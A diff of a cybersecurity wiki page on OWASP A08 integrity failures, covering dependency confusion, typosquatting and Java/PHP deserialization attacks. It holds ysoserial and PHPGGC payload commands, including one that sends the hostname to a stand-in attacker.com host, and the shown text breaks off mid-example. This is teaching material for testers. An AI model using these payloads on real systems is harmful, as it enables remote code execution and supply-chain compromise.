@@ -1,41 +1,60 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Software &amp; Data Integrity Failures # (OWASP A08:2021 / A08:2025)
-Software and Data Integrity Failures occur when code, dependencies, CI/CD pipelines, or serialized data are consumed without verifying they are from a trusted, unmodified source. The application trusts inputs it should not, whether a third-party package, a CDN script, a software update, or a serialized object and executes them with full application privileges.
-Covers: dependency confusion, typosquatting, insecure deserialization, CI/CD pipeline poisoning, unsigned updates, CDN/SRI failures.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Software &amp; Data Integrity Failures" />
-<meta property="og:description" content="Software &amp; Data Integrity Failures # (OWASP A08:2021 / A08:2025)
-Software and Data Integrity Failures occur when code, dependencies, CI/CD pipelines, or serialized data are consumed without verifying they are from a trusted, unmodified source. The application trusts inputs it should not, whether a third-party package, a CDN script, a software update, or a serialized object and executes them with full application privileges.
-Covers: dependency confusion, typosquatting, insecure deserialization, CI/CD pipeline poisoning, unsigned updates, CDN/SRI failures." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>Software &amp; Data Integrity Failures | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Software &amp; Data Integrity Failures# (OWASP A08:2021 / A08:2025)
+Software and Data Integrity Failures occur when code, dependencies, CI/CD pipelines, or serialized data are consumed without verifying they are from a trusted, unmodified source. The application trusts inputs it should not, whether a third-party package, a CDN script, a software update, or a serialized object and executes them with full application privileges.
+Covers: dependency confusion, typosquatting, insecure deserialization, CI/CD pipeline poisoning, unsigned updates, CDN/SRI failures. Notable CWEs: CWE-502 (Deserialization of Untrusted Data), CWE-829 (Inclusion from Untrusted Control Sphere), CWE-494 (Download Without Integrity Check).
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Software & Data Integrity Failures">
+	<meta property="og:description" content="Software &amp; Data Integrity Failures# (OWASP A08:2021 / A08:2025)
+Software and Data Integrity Failures occur when code, dependencies, CI/CD pipelines, or serialized data are consumed without verifying they are from a trusted, unmodified source. The application trusts inputs it should not, whether a third-party package, a CDN script, a software update, or a serialized object and executes them with full application privileges.
+Covers: dependency confusion, typosquatting, insecure deserialization, CI/CD pipeline poisoning, unsigned updates, CDN/SRI failures. Notable CWEs: CWE-502 (Deserialization of Untrusted Data), CWE-829 (Inclusion from Untrusted Control Sphere), CWE-494 (Download Without Integrity Check).">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="Software & Data Integrity Failures">
+	<meta itemprop="description" content="Software &amp; Data Integrity Failures# (OWASP A08:2021 / A08:2025)
+Software and Data Integrity Failures occur when code, dependencies, CI/CD pipelines, or serialized data are consumed without verifying they are from a trusted, unmodified source. The application trusts inputs it should not, whether a third-party package, a CDN script, a software update, or a serialized object and executes them with full application privileges.
+Covers: dependency confusion, typosquatting, insecure deserialization, CI/CD pipeline poisoning, unsigned updates, CDN/SRI failures. Notable CWEs: CWE-502 (Deserialization of Untrusted Data), CWE-829 (Inclusion from Untrusted Control Sphere), CWE-494 (Download Without Integrity Check).">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="2349">
+
+<title>Software &amp; Data Integrity Failures • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -43,11 +62,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -58,9 +81,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -75,8 +95,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -92,8 +112,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -179,8 +199,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -227,8 +247,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -982,8 +1002,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1004,8 +1024,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1026,8 +1046,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1048,8 +1068,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1070,8 +1090,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1105,8 +1125,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1127,8 +1147,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1149,8 +1169,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1171,35 +1191,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1207,30 +1205,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Software &amp; Data Integrity Failures</strong>
+  <h3>Software &amp; Data Integrity Failures</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1287,22 +1286,13 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="software--data-integrity-failures">
-  Software &amp; Data Integrity Failures
-  <a class="anchor" href="#software--data-integrity-failures">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="software--data-integrity-failures">Software &amp; Data Integrity Failures<a class="anchor" href="#software--data-integrity-failures">#</a></h1>
 <p><strong>(OWASP A08:2021 / A08:2025)</strong></p>
 <p>Software and Data Integrity Failures occur when code, dependencies, CI/CD pipelines, or serialized data are consumed without verifying they are from a trusted, unmodified source. The application trusts inputs it should not, whether a third-party package, a CDN script, a software update, or a serialized object and executes them with full application privileges.</p>
 <p>Covers: dependency confusion, typosquatting, insecure deserialization, CI/CD pipeline poisoning, unsigned updates, CDN/SRI failures.
 Notable CWEs: CWE-502 (Deserialization of Untrusted Data), CWE-829 (Inclusion from Untrusted Control Sphere), CWE-494 (Download Without Integrity Check).</p>
-<h2 id="understanding-the-basics">
-  Understanding the Basics
-  <a class="anchor" href="#understanding-the-basics">#</a>
-</h2>
-<h3 id="the-trust-problem">
-  The Trust Problem
-  <a class="anchor" href="#the-trust-problem">#</a>
-</h3>
+<h2 id="understanding-the-basics">Understanding the Basics<a class="anchor" href="#understanding-the-basics">#</a></h2>
+<h3 id="the-trust-problem">The Trust Problem<a class="anchor" href="#the-trust-problem">#</a></h3>
 <p>Applications implicitly trust:</p>
 <ul>
 <li>Package registries resolving the correct version from the correct source</li>
@@ -1312,48 +1302,42 @@ Notable CWEs: CWE-502 (Deserialization of Untrusted Data), CWE-829 (Inclusion fr
 <li>Software updates being signed by the legitimate vendor</li>
 </ul>
 <p>When any of these assumptions break, an attacker can execute arbitrary code at build time, deploy time, or runtime, often with no visible error to the user or developer.</p>
-<h3 id="serialization-fingerprints-identification-quick-reference">
-  Serialization Fingerprints (Identification Quick Reference)
-  <a class="anchor" href="#serialization-fingerprints-identification-quick-reference">#</a>
-</h3>
+<h3 id="serialization-fingerprints-identification-quick-reference">Serialization Fingerprints (Identification Quick Reference)<a class="anchor" href="#serialization-fingerprints-identification-quick-reference">#</a></h3>
 <table>
-<thead>
-<tr>
-<th>Language / Format</th>
-<th>Serialized Identifier</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Java</td>
-<td><code>AC ED 00 05</code> (hex) / <code>rO0</code> (Base64)</td>
-</tr>
-<tr>
-<td>PHP</td>
-<td><code>O:&lt;length&gt;:</code> e.g. <code>O:4:&quot;User&quot;:</code></td>
-</tr>
-<tr>
-<td>Python pickle</td>
-<td><code>\x80\x04</code> (binary protocol byte)</td>
-</tr>
-<tr>
-<td>.NET BinaryFormatter</td>
-<td><code>AAEAAAD</code> (Base64)</td>
-</tr>
-<tr>
-<td>Ruby Marshal</td>
-<td><code>\x04\x08</code></td>
-</tr>
-<tr>
-<td>JSON (safe)</td>
-<td><code>{</code> / <code>[</code> — no gadget risk</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Language / Format</th>
+					<th>Serialized Identifier</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Java</td>
+					<td><code>AC ED 00 05</code> (hex) / <code>rO0</code> (Base64)</td>
+			</tr>
+			<tr>
+					<td>PHP</td>
+					<td><code>O:&lt;length&gt;:</code> e.g. <code>O:4:&quot;User&quot;:</code></td>
+			</tr>
+			<tr>
+					<td>Python pickle</td>
+					<td><code>\x80\x04</code> (binary protocol byte)</td>
+			</tr>
+			<tr>
+					<td>.NET BinaryFormatter</td>
+					<td><code>AAEAAAD</code> (Base64)</td>
+			</tr>
+			<tr>
+					<td>Ruby Marshal</td>
+					<td><code>\x04\x08</code></td>
+			</tr>
+			<tr>
+					<td>JSON (safe)</td>
+					<td><code>{</code> / <code>[</code> — no gadget risk</td>
+			</tr>
+	</tbody>
 </table>
-<h2 id="attack-surface">
-  Attack Surface
-  <a class="anchor" href="#attack-surface">#</a>
-</h2>
+<h2 id="attack-surface">Attack Surface<a class="anchor" href="#attack-surface">#</a></h2>
 <ul>
 <li><strong>Package registries:</strong> npm, PyPI, RubyGems, Maven resolving internal package names from public registries</li>
 <li><strong>CDN-hosted scripts:</strong> <code>&lt;script src=&quot;https://cdn.external.com/lib.js&quot;&gt;</code> without SRI integrity hash</li>
@@ -1364,16 +1348,10 @@ Notable CWEs: CWE-502 (Deserialization of Untrusted Data), CWE-829 (Inclusion fr
 <li><strong>Message queues:</strong> JMS, RabbitMQ, Kafka payloads deserialized by consumers without validation</li>
 <li><strong>ViewState / hidden fields:</strong> .NET <code>__VIEWSTATE</code>, JSF state, custom base64-encoded state fields</li>
 </ul>
-<h2 id="exploiting-integrity-failures">
-  Exploiting Integrity Failures
-  <a class="anchor" href="#exploiting-integrity-failures">#</a>
-</h2>
-<h3 id="1-dependency-confusion">
-  1. Dependency Confusion
-  <a class="anchor" href="#1-dependency-confusion">#</a>
-</h3>
+<h2 id="exploiting-integrity-failures">Exploiting Integrity Failures<a class="anchor" href="#exploiting-integrity-failures">#</a></h2>
+<h3 id="1-dependency-confusion">1. Dependency Confusion<a class="anchor" href="#1-dependency-confusion">#</a></h3>
 <p>Package managers prefer the higher version number. Publish a public package with the same name as an internal private package at a higher version, the build system pulls the attacker&rsquo;s package automatically.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Step 1 — Discover internal package names from public sources</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Step 1 — Discover internal package names from public sources</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Check package.json / requirements.txt / pom.xml leaked in GitHub</span>
 </span></span><span style="display:flex;"><span>grep -r <span style="color:#e6db74">&#34;registry&#34;</span> package.json           <span style="color:#75715e"># custom registry = internal packages</span>
 </span></span><span style="display:flex;"><span>curl https://registry.npmjs.org/&lt;pkg&gt;     <span style="color:#75715e"># 404 = unclaimed = vulnerable</span>
@@ -1389,15 +1367,10 @@ Notable CWEs: CWE-502 (Deserialization of Untrusted Data), CWE-829 (Inclusion fr
 </span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 3 — Victim&#39;s build system runs npm install → pulls attacker&#39;s package</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># preinstall / postinstall hooks execute automatically on npm install</span>
-</span></span></code></pre></div><p>Python pip with <code>--extra-index-url</code> always installs the highest version across all indexes:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># If internal package exists at version 1.0 and attacker publishes 9999.0 to PyPI</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># preinstall / postinstall hooks execute automatically on npm install</span></span></span></code></pre></div><p>Python pip with <code>--extra-index-url</code> always installs the highest version across all indexes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># If internal package exists at version 1.0 and attacker publishes 9999.0 to PyPI</span>
 </span></span><span style="display:flex;"><span>pip install --extra-index-url https://internal.registry.com/simple internal-pkg
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># pip resolves to PyPI version 9999.0 — attacker wins</span>
-</span></span></code></pre></div><h3 id="2-typosquatting">
-  2. Typosquatting
-  <a class="anchor" href="#2-typosquatting">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pip resolves to PyPI version 9999.0 — attacker wins</span></span></span></code></pre></div><h3 id="2-typosquatting">2. Typosquatting<a class="anchor" href="#2-typosquatting">#</a></h3>
 <p>Publish a malicious package with a name one character off from a popular package — targeting developer typos or autocomplete mistakes.</p>
 <pre tabindex="0"><code>Legitimate           Typosquatted
 -----------          ------------
@@ -1406,19 +1379,14 @@ urllib3              urlib3 / urllib2
 axios                axois / axois
 lodash               lodahs / Lodash
 django               djnago / Djanog
-boto3                bot03 / bto3
-</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Confirm a typosquatted package is on PyPI</span>
+boto3                bot03 / bto3</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Confirm a typosquatted package is on PyPI</span>
 </span></span><span style="display:flex;"><span>pip install requets   <span style="color:#75715e"># Note the typo — actually published</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Package runs malicious code via setup.py / __init__.py on install</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if a package name is registered</span>
-</span></span><span style="display:flex;"><span>curl -s https://registry.npmjs.org/requets | python3 -m json.tool | grep <span style="color:#e6db74">&#39;&#34;name&#34;&#39;</span>
-</span></span></code></pre></div><h3 id="3-insecure-deserialization--java-ysoserial">
-  3. Insecure Deserialization — Java (ysoserial)
-  <a class="anchor" href="#3-insecure-deserialization--java-ysoserial">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>curl -s https://registry.npmjs.org/requets | python3 -m json.tool | grep <span style="color:#e6db74">&#39;&#34;name&#34;&#39;</span></span></span></code></pre></div><h3 id="3-insecure-deserialization--java-ysoserial">3. Insecure Deserialization — Java (ysoserial)<a class="anchor" href="#3-insecure-deserialization--java-ysoserial">#</a></h3>
 <p>Java serialized objects beginning with <code>rO0</code> or <code>AC ED 00 05</code> passed in cookies, parameters, or headers are a direct RCE vector if the classpath contains a known gadget chain library.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Step 1 — Identify Java serialization in traffic</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Step 1 — Identify Java serialization in traffic</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Look for rO0 in Base64 cookies or AC ED 00 05 in raw hex</span>
 </span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;rO0ABXNyABFqYXZh...&#34;</span> | base64 -d | xxd | head
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># AC ED 00 05 = Java serialized object confirmed</span>
@@ -1430,19 +1398,15 @@ boto3                bot03 / bto3
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 3 — RCE via CommonsCollections gadget chain</span>
 </span></span><span style="display:flex;"><span>java -jar ysoserial.jar CommonsCollections1 <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#34;curl http://attacker.com/rce?h=</span><span style="color:#66d9ef">$(</span>hostname<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> | base64 -w0
+</span></span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;curl http://attacker.com/rce?h=</span><span style="color:#66d9ef">$(</span>hostname<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> | base64 -w0
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Replace serialized value in request with generated payload</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Common gadget chains to try (in order of prevalence)</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># CommonsCollections1-7, Spring1-2, Groovy1, JRMPClient, Jdk7u21</span>
 </span></span><span style="display:flex;"><span>java -jar ysoserial.jar CommonsCollections5 <span style="color:#e6db74">&#34;id&#34;</span> | base64 -w0
-</span></span><span style="display:flex;"><span>java -jar ysoserial.jar Spring1 <span style="color:#e6db74">&#34;whoami&#34;</span> | base64 -w0
-</span></span></code></pre></div><h3 id="4-insecure-deserialization--php-phpggc">
-  4. Insecure Deserialization — PHP (PHPGGC)
-  <a class="anchor" href="#4-insecure-deserialization--php-phpggc">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>java -jar ysoserial.jar Spring1 <span style="color:#e6db74">&#34;whoami&#34;</span> | base64 -w0</span></span></code></pre></div><h3 id="4-insecure-deserialization--php-phpggc">4. Insecure Deserialization — PHP (PHPGGC)<a class="anchor" href="#4-insecure-deserialization--php-phpggc">#</a></h3>
 <p>PHP <code>unserialize()</code> on user-controlled input enables object injection. <code>PHPGGC</code> generates gadget chain payloads for common frameworks.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># List available PHP gadget chains</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># List available PHP gadget chains</span>
 </span></span><span style="display:flex;"><span>phpggc -l
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Laravel RCE</span>
@@ -1454,21 +1418,16 @@ boto3                bot03 / bto3
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Inject into cookie</span>
 </span></span><span style="display:flex;"><span>PAYLOAD<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>phpggc Laravel/RCE1 system <span style="color:#e6db74">&#34;id&#34;</span> -b<span style="color:#66d9ef">)</span>
